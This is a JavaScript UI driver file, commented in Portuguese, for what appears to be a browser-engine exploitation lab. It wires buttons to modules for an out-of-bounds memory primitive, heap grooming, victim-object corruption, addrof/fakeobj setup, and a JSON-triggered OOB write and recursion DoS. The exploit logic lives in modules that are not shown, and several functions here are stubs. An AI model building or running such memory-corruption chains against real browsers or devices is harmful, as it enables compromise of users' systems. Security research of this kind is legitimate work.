// js/app.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import * as Int64Lib from './int64.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
import * as Corruptor from './victim_corruptor.mjs';
import * as PostExploit from './post_exploit_conceptual.mjs';
import * as JsonExploitTest from './json_exploit_test.mjs';
import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
import * as VictimFinder from './victim_finder.mjs';

let uiInitialized = false;

const App = {
    exploitSuccessfulThisSession: false, // Usado para grooming/gap
    isCurrentlyRunningStrategies: false, // Usado para grooming/gap

    // Função de grooming (marcada como WIP, então o botão está desabilitado no HTML)
    runAllGroomingStrategies: async () => {
        const FNAME_STRAT = "App.runAllGroomingStrategies";
        appLog("AVISO: Funcionalidade de Grooming/Busca de GAP está em desenvolvimento e pode não funcionar.", "warn", FNAME_STRAT);
        // ... (manter a lógica existente, mas sabendo que pode não estar completa)
        if (App.isCurrentlyRunningStrategies) return;
        App.isCurrentlyRunningStrategies = true;
        // ... (resto da lógica como antes) ...
        App.isCurrentlyRunningStrategies = false;
    },

    // Função de teste de GAP (marcada como WIP)
    updateCurrentTestGapFromScanUIAndTestSingle: () => {
        const FNAME_SINGLE = "App.updateCurrentTestGapFromScanUIAndTestSingle";
        appLog("AVISO: Funcionalidade de Teste de GAP está em desenvolvimento.", "warn", FNAME_SINGLE);
        // ... (manter a lógica existente) ...
    },

    setupUIEventListeners: () => {
        // Testes de Módulos
        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
        if (moduleTestButtonsContainer) {
            moduleTestButtonsContainer.innerHTML = ''; // Limpa para evitar duplicação
            const btnTestInt64 = document.createElement('button');
            btnTestInt64.textContent = 'Testar Módulo Int64';
            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
            moduleTestButtonsContainer.appendChild(btnTestInt64);

            const btnTestUtils = document.createElement('button');
            btnTestUtils.textContent = 'Testar Módulo Utils';
            btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule(appLog)); // Passar appLog
            moduleTestButtonsContainer.appendChild(btnTestUtils);

            const btnTestCore = document.createElement('button');
            btnTestCore.textContent = 'Testar Módulo CoreExploit (OOB)';
            btnTestCore.onclick = () => Core.testModule(appLog); // Passar appLog
            moduleTestButtonsContainer.appendChild(btnTestCore);
        }

        // Passo 0
        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);

        // Passos 1 & 2 (Desabilitados no HTML por enquanto, mas listeners podem ficar)
        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', () => {
            appLog("Botão 'Iniciar Busca & Corrupção' (Passo 2) clicado - Funcionalidade WIP.", "warn", "App");
            Corruptor.findAndCorruptVictimFields_Iterative();
        });
        document.getElementById('btnTestKnownGap')?.addEventListener('click', () => {
             appLog("Botão 'Testar Corrupção no GAP Conhecido' (Passo 2) clicado - Funcionalidade WIP.", "warn", "App");
            Corruptor.testCorruptKnownGap();
        });

        // Passos 3 & 4
        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);

        // Passo 5: Teste JSON DoS por Recursão
        document.getElementById('btnTestJsonRecursionExploit')?.addEventListener('click', async () => {
            const scenarioSelectEl = document.getElementById('jsonRecursionScenarioSelect');
            const selectedScenario = scenarioSelectEl ? scenarioSelectEl.value : 'scenario_poc_v23s_corrected';
            appLog(`Botão 'Testar JSON DoS por Recursão' clicado. Cenário: ${selectedScenario}`, 'test', 'App.JsonDoS');
            
            // O objeto passado para JSON.stringify é definido dentro de cada PoC/cenário
            // Aqui apenas chamamos a função de topo que internamente usa seu próprio testObject.
            await JsonExploitTest.runJsonRecursionTest(selectedScenario);
        });

        const btnFindVictimEl = document.getElementById('btnFindVictim');
if (btnFindVictimEl) {
    btnFindVictimEl.onclick = () => {
        // Ler valores hex e converter para número para scanStartOffset
        const offsetHexStr = document.getElementById('victimFinderScanStartOffset').value;
        let offsetInt;
        try {
            offsetInt = parseInt(offsetHexStr, 16);
            if (isNaN(offsetInt)) throw new Error("Valor Hex inválido");
        } catch (e) {
            appLog(`Offset inicial de varredura '${offsetHexStr}' é inválido. Usando null para que VictimFinder use o padrão.`, "warn", "App.VictimFinderUI");
            offsetInt = null; // Deixa VictimFinder decidir o padrão
        }
        document.getElementById('victimFinderScanStartOffset').value = offsetInt !== null ? `0x${offsetInt.toString(16)}` : ""; // Atualiza UI com valor processado ou limpa

        VictimFinder.findVictimButtonHandler(); // findVictimButtonHandler agora lê os campos internamente.
    };
}

        // Passo 6: JSON como Gatilho OOB Exploit
        document.getElementById('btnJsonTriggerOOBExploit')?.addEventListener('click', async () => {
            appLog("Botão 'Executar JSON como Gatilho OOB Exploit' clicado.", 'test', 'App.JsonOOB');
            if (!Core.oob_dataview_real) {
                appLog("ERRO: Primitiva OOB (Core.oob_dataview_real) não está ativa. Execute o Passo 0 primeiro!", "error", "App.JsonOOB");
                return;
            }

            const targetObjectSelectEl = document.getElementById('jsonOobTargetObject');
            const relativeOffsetEl = document.getElementById('jsonOobRelativeOffset');
            const valueToWriteHexEl = document.getElementById('jsonOobValueToWriteHex');
            const bytesToReadEl = document.getElementById('jsonOobBytesToRead');

            const targetObjectType = targetObjectSelectEl ? targetObjectSelectEl.value : 'new_array_buffer';
            const relativeOffset = relativeOffsetEl ? parseInt(relativeOffsetEl.value) : 0;
            const valueHex = valueToWriteHexEl ? valueToWriteHexEl.value : "0x0";
            const bytesToRead = bytesToReadEl ? parseInt(bytesToReadEl.value) : 4;
            let valueToWrite;

            try {
                valueToWrite = parseInt(valueHex); // Deveria usar AdvancedInt64 para valores maiores que 32bit
                if (isNaN(valueToWrite)) throw new Error("Valor para escrita inválido");
            } catch (e) {
                appLog(`Valor para escrita OOB inválido: '${valueHex}'. Usando 0.`, 'warn', 'App.JsonOOB');
                valueToWrite = 0;
            }

            let objectForJsonStringify;
            switch (targetObjectType) {
                case 'core_oob_buffer':
                    objectForJsonStringify = Core.oob_array_buffer_real;
                    if (!objectForJsonStringify) {
                        appLog("ERRO: Core.oob_array_buffer_real não está definido! Execute Passo 0.", "error", "App.JsonOOB");
                        return;
                    }
                    break;
                case 'new_array_buffer':
                default:
                    objectForJsonStringify = new ArrayBuffer(128); 
                    break;
            }
            appLog(`Alvo para JSON.stringify (que terá 'toJSON' chamado): ${objectForJsonStringify.constructor.name} (${objectForJsonStringify.byteLength || 'N/A'} bytes)`, 'info', 'App.JsonOOB');

            await JsonExploitTest.jsonTriggeredOOBInteraction(
                objectForJsonStringify,
                relativeOffset,
                valueToWrite,
                bytesToRead
            );
        });

        // Listeners para Configurações Globais OOB
        document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
    },

    initialize: () => {
        if (uiInitialized) {
            appLog("App.initialize: UI já inicializada. Ignorando.", "warn", "App.Init");
            return;
        }
        updateGlobalOOBConfig(); // Lê valores iniciais da UI para config OOB
        App.setupUIEventListeners();
        App.exploitSuccessfulThisSession = false;
        App.isCurrentlyRunningStrategies = false;
        
        const btnRunStrategies = document.getElementById('btnRunGroomingStrategies');
        if (btnRunStrategies) { // Mantém desabilitado se o HTML o define assim
            // btnRunStrategies.disabled = false; 
            // btnRunStrategies.textContent = "Executar Todas Estratégias de Grooming & Busca de GAP";
        }
        appLog("Laboratório Modular (v2.9.0 - JSON OOB Trigger) pronto.", "good", "App.Init");
        const addrofGapEl = document.getElementById('addrofGap');
        if (addrofGapEl) addrofGapEl.value = ""; // Limpa campo
        uiInitialized = true;
    }
};

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.initialize);
} else {
    App.initialize();
}

appLog("app.mjs carregado e pronto.", "info", "Global");
